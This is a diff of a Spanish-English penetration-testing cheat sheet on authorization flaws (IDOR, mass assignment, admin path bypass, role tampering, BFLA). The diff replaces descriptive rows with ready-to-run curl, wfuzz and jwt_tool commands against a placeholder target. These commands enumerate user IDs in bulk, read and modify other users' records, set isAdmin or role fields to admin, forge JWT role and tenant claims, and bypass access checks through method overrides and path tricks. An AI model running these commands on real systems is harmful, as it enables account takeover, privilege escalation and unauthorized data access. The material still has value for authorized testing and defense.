@@ -26,38 +26,33 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Sequential IDs | `/api/users/1` → `/api/users/2` (otro user) | Standard IDOR. |
-| UUID predictable | UUIDv1 contiene timestamp | Predict next. |
-| Numeric in body | `{"user_id": 1}` → modify a 2 | Body field. |
-| Parameter manipulation | `?account_id=42` change | Query string. |
-| Cookie value | If cookie tied to ID without server check | Cookie tampering. |
-| GraphQL global ID | `node(id:"VXNlcjox")` decoded → forge | Relay-style. |
-| Path segment | `/team/X/admin` → `/team/Y/admin` | Multi-tenant. |
-| Object reference en form | Hidden field con object ID | Form tampering. |
-| WebSocket message ID | WS payload con object ID | Real-time. |
-| Internal IDs leaked en response | Response includes other user IDs | Recon source. |
-| Bulk endpoints | `?ids=[1,2,3,...,1000]` | Bulk IDOR. |
-| API filter | `GET /api/users?manager_id=1` revealing | Disclosure. |
-| Combine con sequential prediction | Loop IDs + check 200 vs 403 | Bulk enum. |
-| Check function-level + object-level | Owner check missing | BOLA. |
-| Combine con Mass Assignment | Update otro's profile | Compound. |
+| `curl -H "Cookie: session=$MY" https://target/api/users/2` (siendo user 1) | Lee otro user (IDOR sequential) | App sin owner check. |
+| `for id in {1..1000}; do curl -s -H "Cookie: session=$MY" -o /dev/null -w "%{http_code} $id\n" https://target/api/users/$id; done \| grep '^200'` | Bulk IDOR enumeration | Sequential IDs. |
+| `curl -X PATCH -H "Cookie: session=$MY" -d '{"email":"attacker@evil.com"}' https://target/api/users/2` | Modify other user — combo Mass Assignment | IDOR + write. |
+| `curl -H "Cookie: session=$MY" "https://target/api/orders?account_id=42"` (cambiar account_id) | Query param IDOR | Account-scoped resource. |
+| `curl -X POST -H "Cookie: session=$MY" -d '{"user_id":2,"action":"x"}' https://target/api/x` | Body field IDOR | Hidden field tampering. |
+| `echo "VXNlcjox" \| base64 -d` y `echo -n "User:42" \| base64` | Decode/forge GraphQL global ID | Relay-style IDOR. |
+| `curl -X POST -H "Cookie: session=$MY" -d '{"query":"{node(id:\"VXNlcjo0Mg==\"){...on User{email}}}"}' https://target/graphql` | GraphQL global ID IDOR | Forge global ID. |
+| `curl -H "Cookie: session=$MY" "https://target/api/users?ids[]=1&ids[]=2&ids[]=3"` | Bulk endpoint IDOR | Array param. |
+| `curl -H "Cookie: session=$MY" "https://target/team/B/admin"` (cambiar team) | Multi-tenant IDOR | Path-based tenant scoping. |
+| `wfuzz -c -z range,1-1000 -H "Cookie: session=$MY" --hh 24 https://target/api/users/FUZZ` | wfuzz con response-length filter | Auto-detect ID hits. |
 ^auth-authz-idor
 
 ### Workflow IDOR
 
 ```bash
-# 1. Identify sensitive endpoint
+# 1. Identify own ID
 curl -H "Cookie: session=$MY_TOKEN" https://target/api/users/me
-# Response: {id: 1337, email: "atacante@evil.com", ...}
+# {id: 1337, ...}
 
-# 2. Try other IDs
-for id in 1 2 3 100 1000 9999; do
-  curl -s -H "Cookie: session=$MY_TOKEN" "https://target/api/users/$id" | head
+# 2. Bulk enumeration
+for id in $(seq 1 1000); do
+  CODE=$(curl -s -H "Cookie: session=$MY_TOKEN" -o /dev/null -w "%{http_code}" "https://target/api/users/$id")
+  [ "$CODE" = "200" ] && echo "ID $id accessible"
 done
 
-# Si returns other user data → IDOR confirmed
-# Si returns 403 → owner check active
-# Si combinado con Mass Assignment → modify other user
+# 3. Confirm IDOR by reading sensitive field
+curl -H "Cookie: session=$MY_TOKEN" https://target/api/users/1 | jq .email
 ```
 
 ___
@@ -66,15 +61,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| isAdmin self-set | Body con `{"isAdmin": true}` | Direct privesc. |
-| role | `{"role": "admin"}` | Variant. |
-| permissions array | `{"permissions": ["*"]}` | Wildcard. |
-| Combine con IDOR | IDOR + mass assign updates victim | High impact. |
-| GraphQL mutation input | Input type incluye sensitive | Direct. |
-| Hidden form fields | If form excluye admin, atacante adds | Backend trusts. |
-| API DTO completo | Full DTO con admin flag injected | Standard. |
-| Detect via Swagger / introspection | Schema discovery | Pre-explotación. |
-| See also | `Mass Assignment` para detalle | Cross-ref. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"isAdmin":true}' https://target/api/users/me` | Privesc directo | Update profile sin field filter. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"role":"admin"}' https://target/api/users/me` | Role string privesc | RBAC field mutable. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"permissions":["*"]}' https://target/api/users/me` | Wildcard permissions | Granular RBAC. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"is_superuser":true,"is_staff":true}' https://target/api/users/me` | Django superuser + staff | Django backend. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"isAdmin":true}' https://target/api/users/2` (IDOR + MA combo) | Privesc otro user | IDOR + Mass Assign chain. |
+| `{"query":"{__type(name:\"UserInput\"){inputFields{name}}}"}` | Discover input type fields (GraphQL) | Pre-attack schema. |
+| `{"query":"mutation{updateUser(input:{isAdmin:true}){id}}"}` | GraphQL mutation privesc | GraphQL backend. |
+| `for f in isAdmin is_admin admin role roles is_superuser is_staff permissions; do curl -X PATCH -H "$C" -d "{\"$f\":true}" https://target/api/users/me; done` | Bulk field probe | Discovery. |
 ^auth-authz-mass-assign
 
 ___
@@ -83,17 +77,16 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Direct admin path | `/admin` accessible sin auth | Forced browsing. |
-| Path traversal en authorized path | `/user/../admin` | Path normalization. |
-| Hidden admin namespace | `/api/v2/admin` exists vs `/api/v1/admin` | Versioning. |
-| Internal API exposure | `/internal/admin` reachable externally | Misconfig. |
-| Method override | POST `/users` con `_method=DELETE` to admin endpoint | Verb tampering. |
-| GraphQL alias to admin field | Alias requested admin query | Bypass per-field check. |
-| Path segment trust | If `/admin` checked but `/admin/sub` not | Subpath bypass. |
-| Encoded path | `%2Fadmin` o `%2e%2e%2fadmin` | Encoding. |
-| HTTP/2 :path injection | H2 pseudo-header | H2 specific. |
-| Combine con Open Redirect | Redirect chain to admin | Chain. |
-| Combine con HRS | Smuggle admin request | Compound. |
+| `curl https://target/admin` | Forced browsing direct | Client-side auth check. |
+| `curl https://target/api/v1/admin` y `curl https://target/api/v2/admin` | Version differential | Old version sin auth. |
+| `curl https://target/internal/admin` | Internal namespace exposure | Misconfig externally reachable. |
+| `curl "https://target/user/../admin"` | Path traversal escape | Path normalization. |
+| `curl https://target//admin` y `curl https://target/./admin` | Path normalization tricks | Router bypass. |
+| `curl https://target/admin%2F` (encoded slash) | Encoded path | Decode-after-validate. |
+| `curl "https://target/admin/sub-feature"` (subpath check missing) | Subpath bypass | Top-level checked, sub missing. |
+| `curl --http2 -H ":path: /admin" https://target/` | HTTP/2 :path injection | H2 pseudo-header. |
+| `curl -X POST -H "_method: GET" https://target/admin` | Method override path bypass | Combo. |
+| `{"query":"{a:adminQuery{...} b:userQuery{...}}"}` (GraphQL alias) | Alias requested admin field | Per-field check missing. |
 ^auth-authz-path
 
 ___
@@ -102,18 +95,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Cookie role tampering | Cookie con `role=admin` (cleartext) | Direct. |
-| JWT claim forgery | Modify JWT con `role:admin` | Combine con JWT bypass. |
-| Session role override | App stores role en client-side session | Tampering. |
-| Hidden form role field | Modify hidden role field | Form. |
-| API role change | `PUT /users/me/role` con admin | Direct API. |
-| OAuth scope injection | Manipulate scope claim | OAuth. |
-| Active role switching | If app permite role switch (legit feature) | Abuse. |
-| Tenant-level admin | `tenant_id=victim` en multi-tenant | Cross-tenant. |
-| Group membership injection | Add self to admin group via request | Combine mass assign. |
-| LDAP DN modify | DN injection sets group | Combo LDAP. |
-| Privilege inheritance | Inherit privileges via membership chain | Logic flaw. |
-| Combine con audit log forge | Modify role + cover tracks | Stealth. |
+| `curl -b "role=admin" https://target/` | Cookie role tampering | Cleartext cookie con role. |
+| `python3 jwt_tool.py $JWT -I -pc role -pv admin` | JWT role claim forgery | Combine JWT bypass. |
+| `curl -X PUT -H "Cookie: $C" -d '{"role":"admin"}' https://target/api/users/me/role` | Direct API role change | Endpoint sin admin gate. |
+| `curl -X POST -H "Cookie: $C" -d '{"group":"admins"}' https://target/api/users/me/groups` | Add self a admin group | Group membership inject. |
+| `curl -X POST -H "Cookie: $C" -d '{"scope":"admin read write"}' https://target/oauth/token` | OAuth scope injection | OAuth refresh con scope expansion. |
+| `python3 jwt_tool.py $JWT -I -pc tenant_id -pv victim_tenant` | Cross-tenant role swap | JWT tenant claim mutable. |
+| Decodear cookie `b64decode + JSON inspect` y modify role | Manual cookie tampering | Self-signed session. |
+| `curl -X PATCH -d '{"memberOf":["cn=admin,dc=target,dc=com"]}' https://target/api/users/me` | LDAP DN inject | LDAP-backed apps. |
 ^auth-authz-role
 
 ___
@@ -122,21 +111,16 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Backend has function-level auth on certain verbs but not all | OWASP API4 BFLA. |
-| GET allowed, POST not checked | `POST /admin/users` sin auth check | Standard BFLA. |
-| GET checked, PATCH not | `PATCH` modify other resources | Variant. |
-| OPTIONS unprotected | OPTIONS reveals methods | Recon. |
-| HEAD unprotected | HEAD returns headers w/o body | Disclosure. |
-| Custom methods | App-specific verbs | Edge. |
-| Method override headers | `X-HTTP-Method-Override: DELETE` | Verb conversion. |
-| Form `_method` field | `_method=DELETE` | Rails / Symfony. |
-| Bypass via case | `Get /admin` (some servers strict) | Edge. |
-| GraphQL `mutation` instead `query` | Mutations less protected | GraphQL specific. |
-| WebSocket message types | WS sends typed messages | Auth per-type missing. |
-| Bulk endpoints | `POST /users/bulk` con admin actions | Edge. |
-| Combine con Mass Assignment | Verb + payload | Compound. |
-| Common API mistake | App uses middleware on GET, missing on PATCH | Common bug. |
-| OWASP API Top 10 | API4 BFLA / API5 BOLA | Reference. |
+| `curl -X POST -H "Cookie: $C" -d '{"email":"x@y.z"}' https://target/admin/users` | POST sin auth check (GET protegido) | Function-level auth gap. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"role":"admin"}' https://target/admin/users/2` | PATCH modify sin auth (GET checked) | OWASP API4 BFLA. |
+| `curl -X DELETE -H "Cookie: $C" https://target/admin/users/2` | DELETE without admin check | Standard BFLA. |
+| `curl -X OPTIONS https://target/admin -i \| grep -i allow` | Lista métodos disponibles | Recon. |
+| `curl -X HEAD -H "Cookie: $C" https://target/admin/secret-data -i` | Headers w/o body — info disclosure bypass | HEAD-specific. |
+| `curl -X POST -H "X-HTTP-Method-Override: DELETE" -H "Cookie: $C" https://target/admin/users/2` | Method override verb conversion | Spring/Symfony. |
+| `curl -X "Get" -H "Cookie: $C" https://target/admin` (case mixed) | Case sensitivity bypass | Strict parsers. |
+| `{"query":"mutation{adminAction{result}}"}` (en GraphQL mutation) | Mutations less protected que queries | GraphQL specific. |
+| `for m in GET POST PUT PATCH DELETE OPTIONS HEAD FOO; do echo "=== $m ==="; curl -s -X $m -H "Cookie: $C" https://target/admin/users/2 -o /dev/null -w "%{http_code}\n"; done` | Bulk verb probe | Discovery. |
+| `curl -X POST -H "Cookie: $C" -d '[{"id":2,"role":"admin"}]' https://target/api/users/bulk` | Bulk endpoint con admin actions | Edge BFLA. |
 ^auth-authz-bfla
 
 ***
